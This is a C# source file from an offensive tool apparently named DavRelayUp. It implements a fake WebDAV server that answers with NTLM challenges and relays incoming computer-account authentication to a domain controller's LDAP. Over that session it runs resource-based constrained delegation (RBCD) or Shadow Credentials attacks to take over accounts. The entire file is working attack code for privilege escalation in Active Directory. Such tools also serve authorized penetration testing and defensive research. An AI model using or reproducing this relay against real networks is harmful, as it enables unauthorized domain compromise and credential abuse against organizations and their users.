using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Reflection;
using static DavRelayUp.Relay.Natives;

namespace DavRelayUp.Relay
{
    public class HttpServer
    {
        private class Connection
        {
            public int state;
            public Ldap ldap;
        }

        private HttpListener listener;
        private Dictionary<ulong, Connection> connections = new Dictionary<ulong, Connection>();
        private byte[] imgBytes;

        public HttpServer(string prefix, byte[] img)
        {
            listener = new HttpListener();
            listener.Prefixes.Add(prefix);
            imgBytes = img;
        }

        private static ulong GetConnectionId(HttpListenerRequest req)
        {
            try
            {
                FieldInfo info = typeof(HttpListenerRequest).GetField("m_ConnectionId",
                    BindingFlags.Instance |
                    BindingFlags.NonPublic |
                    BindingFlags.GetField);

                if (info == null)
                {
                    info = typeof(HttpListenerRequest).GetField("_connectionId",
                        BindingFlags.NonPublic |
                        BindingFlags.Instance |
                        BindingFlags.GetField);
                }

                return (ulong)info.GetValue(req);
            }
            catch (Exception e)
            {
                // TODO log exception
                return 0;
            }
        }

        private void SendErrorResponse(HttpListenerResponse resp)
        {
            resp.StatusCode = 500;
            resp.StatusDescription = "Internal Server Error";
            resp.Close();
        }

        private void SendSuccessResponse(HttpListenerRequest req, HttpListenerResponse resp)
        {
            switch (req.HttpMethod)
            {
                case "OPTIONS":
                    {
                        resp.StatusCode = 200;
                        resp.StatusDescription = "OK";
                        resp.ContentLength64 = 0;
                        resp.AddHeader("Content-Type", "text/html");
                        resp.OutputStream.Close();
                        resp.Close();
                        break;
                    }
                case "HEAD":
                    {
                        resp.StatusCode = 200;
                        resp.StatusDescription = "OK";
                        resp.ContentLength64 = 0;
                        resp.AddHeader("Allow", "GET, HEAD, POST, PUT, DELETE, OPTIONS, PROPFIND, PROPPATCH, MKCOL, LOCK, UNLOCK, MOVE, COPY");
                        resp.AddHeader("Connection", "close");
                        resp.OutputStream.Close();
                        resp.Close();
                        break;
                    }
                case "PROPFIND":
                    {
                        string content;
                        if (req.Url.LocalPath.ToLower().Contains(".jpg"))
                        {
                            content = $"<?xml version=\"1.0\"?><D:multistatus xmlns:D=\"DAV:\"><D:response><D:href>{req.Url.OriginalString}</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>image.JPG</D:displayname><D:getcontentlength>4456</D:getcontentlength><D:getcontenttype>image/jpeg</D:getcontenttype><D:getetag>4ebabfcee4364434dacb043986abfffe</D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>";
                        }
                        else
                        {
                            content = $"<?xml version=\"1.0\"?><D:multistatus xmlns:D=\"DAV:\"><D:response><D:href>{req.Url.OriginalString}</D:href><D:propstat><D:prop><D:creationdate>2016-11-12T22:00:22Z</D:creationdate><D:displayname>a</D:displayname><D:getcontentlength></D:getcontentlength><D:getcontenttype></D:getcontenttype><D:getetag></D:getetag><D:getlastmodified>Mon, 20 Mar 2017 00:00:22 GMT</D:getlastmodified><D:resourcetype><D:collection></D:collection></D:resourcetype><D:supportedlock></D:supportedlock><D:ishidden>0</D:ishidden></D:prop><D:status>HTTP/1.1 200 OK</D:status></D:propstat></D:response></D:multistatus>";
                        }
                        var bytes = Encoding.UTF8.GetBytes(content);
                        resp.StatusCode = 207;
                        resp.StatusDescription = "Multi-Status";
                        resp.ContentLength64 = bytes.Length;
                        resp.AddHeader("Content-Type", "text/xml");
                        resp.OutputStream.Write(bytes, 0, bytes.Length);
                        resp.OutputStream.Close();
                        resp.Close();
                        break;
                    }
                default:
                    {
                        resp.StatusCode = 200;
                        resp.StatusDescription = "OK";
                        resp.ContentLength64 = imgBytes.Length;
                        resp.AddHeader("Content-Type", "image/jpeg");
                        resp.AddHeader("Connection", "close");
                        resp.OutputStream.Write(imgBytes, 0, imgBytes.Length);
                        resp.OutputStream.Close();
                        resp.Close();
                        break;
                    }
            }
        }

        public void Start()
        {
            listener.Start();
        }

        public async Task HandleConnections()
        {
            while (listener.IsListening)
            {
                HttpListenerContext ctx = null;
                try
                {
                    ctx = await listener.GetContextAsync();
                }
                catch
                {
                    break;
                }
                HttpListenerRequest req = ctx.Request;
                HttpListenerResponse resp = ctx.Response;

                if (Options.attackDone)
                {
                    SendSuccessResponse(req, resp);
                    continue;
                }

                // NTLM authentication for HTTP is connection-based so we must associate
                // the request with the underlying socket to determine the state correctly
                var connId = GetConnectionId(req);
                if (connId == 0) // Unable to get the connection ID for some reason
                {
                    SendErrorResponse(resp);
                    continue;
                }

                if (req.Headers["Authorization"] == null || !req.Headers["Authorization"].StartsWith("NTLM "))
                {
                    resp.StatusCode = 401;
                    resp.StatusDescription = "Unauthorized";
                    resp.AddHeader("WWW-Authenticate", "NTLM");
                    resp.KeepAlive = true;
                    resp.Close();
                    continue;
                }

                var authData = Convert.FromBase64String(req.Headers["Authorization"].Substring(5));

                if (!connections.ContainsKey(connId)) // NEGOTIATE_MESSAGE
                {
                    var ldap = new Ldap();
                    if (!ldap.Connect())
                    {
                        SendErrorResponse(resp);
                        continue;
                    }

                    // Send negotiate to LDAP
                    var challenge = ldap.Bind(authData, out int status);
                    if ((LdapStatus)status != LdapStatus.LDAP_SASL_BIND_IN_PROGRESS)
                    {
                        Console.WriteLine("[-] Could not bind to {0}. ldap_sasl_bind_s failed with error code 0x{1}",
                            Options.domainController, status.ToString("x2"));
                        SendErrorResponse(resp);
                        continue;
                    }

                    if (challenge == null)
                    {
                        Console.WriteLine("[-] Got no NTLM challenge from LDAP");
                        SendErrorResponse(resp);
                        continue;
                    }

                    connections[connId] = new Connection
                    {
                        state = 1,
                        ldap = ldap
                    };

                    resp.StatusCode = 401;
                    resp.StatusDescription = "Unauthorized";
                    resp.AddHeader("WWW-Authenticate", "NTLM " + Convert.ToBase64String(challenge));
                    resp.KeepAlive = true;
                    resp.Close();
                    continue;
                }

                var conn = connections[connId];
                if (conn.state == 1) // AUTHENTICATE_MESSAGE
                {
                    // Peek inside the message to make sure we got a computer account
                    var domainNameLen = BitConverter.ToUInt16(authData, 28);
                    var domainNameOffset = BitConverter.ToUInt32(authData, 32);
                    var domainName = Encoding.Unicode.GetString(authData, (int)domainNameOffset, domainNameLen);

                    var userNameLen = BitConverter.ToUInt16(authData, 36);
                    var userNameOffset = BitConverter.ToUInt32(authData, 40);
                    var userName = Encoding.Unicode.GetString(authData, (int)userNameOffset, userNameLen);

                    var fullName = domainName + "\\" + userName;

                    if (!userName.EndsWith("$"))
                    {
                        if (Options.verbose)
                            Console.WriteLine($"[+] Got AUTHENTICATE_MESSAGE from {fullName}, skipping it");
                        connections.Remove(connId);
                        SendSuccessResponse(req, resp);
                        continue;
                    }
                    Console.WriteLine($"[+] Authenticating as {fullName}");
                    conn.ldap.Bind(authData, out int status);
                    if ((LdapStatus)status != LdapStatus.LDAP_SUCCESS)
                    {
                        Console.WriteLine("[-] Could not bind to {0}. ldap_sasl_bind_s failed with error code 0x{1}",
                            Options.domainController, status.ToString("x2"));
                        connections.Remove(connId);
                        SendErrorResponse(resp);
                        continue;
                    }

                    Console.WriteLine("[+] LDAP session established!");

                    try
                    {
                        LdapStatus result = LdapStatus.LDAP_SUCCESS;
                        if (Options.relayAttackType == Options.RelayAttackType.RBCD)
                        {
                            if (!string.IsNullOrEmpty(Options.rbcdComputerSid))
                                result = Attacks.Ldap.RBCD.Attack(conn.ldap.ld);
                        }
                        else if (Options.relayAttackType == Options.RelayAttackType.ShadowCred)
                        {
                            result = Attacks.Ldap.ShadowCred.Attack(conn.ldap.ld);
                        }

                        if (result != LdapStatus.LDAP_SUCCESS)
                        {
                            Console.WriteLine("[-] Could not perform operation at {0}: got status {1}",
                                Options.domainController, result.ToString());
                            conn.ldap.Unbind();
                            connections.Remove(connId);
                            SendSuccessResponse(req, resp);
                            break;
                        }
                        Options.attackDone = true;
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("[-] {0}", e);
                    }

                    conn.ldap.Unbind();
                    conn.state = 2;
                    SendSuccessResponse(req, resp);
                    if (Options.attackDone)
                        break;
                    continue;
                }
                else // This connection is authenticated
                {
                    SendSuccessResponse(req, resp);
                    continue;
                }
            }
        }

        public void Stop()
        {
            listener.Close();
        }
    }
}